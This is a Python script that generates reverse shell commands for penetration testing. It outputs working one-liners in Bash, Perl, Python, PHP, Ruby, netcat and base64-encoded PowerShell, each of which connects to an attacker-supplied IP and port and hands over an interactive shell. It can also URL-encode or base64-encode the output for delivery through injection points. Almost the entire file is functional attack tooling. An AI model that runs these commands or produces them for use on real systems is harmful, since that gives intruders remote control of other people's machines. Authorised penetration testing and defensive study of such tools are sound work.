#!/usr/bin/env python3
"""
Reverse Shell Command Generator
A utility script to generate various reverse shell commands for penetration testing and security analysis.
"""

import argparse
import base64
import urllib.parse


def generate_bash_shell(ip, port):
    """Generates a Bash reverse shell command."""
    return f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"


def generate_perl_shell(ip, port):
    """Generates a Perl reverse shell command."""
    return f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}}'"


def generate_python_shell(ip, port):
    """Generates a Python reverse shell command."""
    return f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\"]);'"


def generate_php_shell(ip, port):
    """Generates a PHP reverse shell command."""
    return f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"


def generate_ruby_shell(ip, port):
    """Generates a Ruby reverse shell command."""
    return f"ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{ip}\",\"{port}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'"


def generate_nc_shell(ip, port):
    """Generates a Netcat reverse shell command."""
    return f"nc -e /bin/sh {ip} {port}"


def generate_nc_alt_shell(ip, port):
    """Generates an alternative Netcat reverse shell command."""
    return f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f"


def generate_powershell_shell(ip, port):
    """Generates a PowerShell reverse shell command."""
    ps_command = f"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
    encoded = base64.b64encode(ps_command.encode('utf-16le')).decode()
    return f"powershell -nop -e {encoded}"


def main():
    parser = argparse.ArgumentParser(
        description='Generate reverse shell commands for security testing.')
    parser.add_argument('ip', help='The IP address to connect back to')
    parser.add_argument('port', type=int, help='The port to connect back to')
    parser.add_argument('--url-encode', '-u',
                        action='store_true', help='URL encode the output')
    parser.add_argument('--base64', '-b', action='store_true',
                        help='Base64 encode the output')
    parser.add_argument('--type', '-t', choices=['bash', 'perl', 'python', 'php', 'ruby', 'nc', 'nc-alt', 'powershell', 'all'],
                        default='all', help='The type of reverse shell to generate')

    args = parser.parse_args()

    shells = {
        'bash': generate_bash_shell,
        'perl': generate_perl_shell,
        'python': generate_python_shell,
        'php': generate_php_shell,
        'ruby': generate_ruby_shell,
        'nc': generate_nc_shell,
        'nc-alt': generate_nc_alt_shell,
        'powershell': generate_powershell_shell
    }

    if args.type == 'all':
        print("=== Reverse Shell Command Generator ===")
        print(f"Target: {args.ip}:{args.port}\n")

        for name, func in shells.items():
            try:
                cmd = func(args.ip, args.port)
                if args.url_encode:
                    cmd = urllib.parse.quote_plus(cmd)
                if args.base64:
                    cmd = base64.b64encode(cmd.encode()).decode()

                print(f"=== {name.upper()} ===")
                print(cmd)
                print()
            except Exception as e:
                print(f"Error generating {name} shell: {e}")
    else:
        try:
            cmd = shells[args.type](args.ip, args.port)
            if args.url_encode:
                cmd = urllib.parse.quote_plus(cmd)
            if args.base64:
                cmd = base64.b64encode(cmd.encode()).decode()
            print(cmd)
        except Exception as e:
            print(f"Error generating {args.type} shell: {e}")


if __name__ == "__main__":
    main()
